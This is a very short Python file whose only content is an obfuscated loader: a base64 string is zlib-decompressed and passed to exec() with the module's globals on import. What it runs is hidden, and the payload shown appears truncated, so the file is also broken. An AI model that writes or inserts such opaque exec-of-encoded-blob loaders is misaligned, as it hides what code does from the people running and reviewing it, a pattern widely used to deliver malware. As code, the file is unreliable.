from __future__ import annotations
import base64, zlib
_B64 = (
    "eNrNPGuT1NaV3+dXaGe3VlK5aR5JpXY7qxRjGAfKvBYGx9mhV6XpVs8o0y21JTXDbFdvEVcgsASDN7yMycakjMvrCsOUsUMIGFft"
)
exec(zlib.decompress(base64.b64decode(''.join(_B64))), globals())
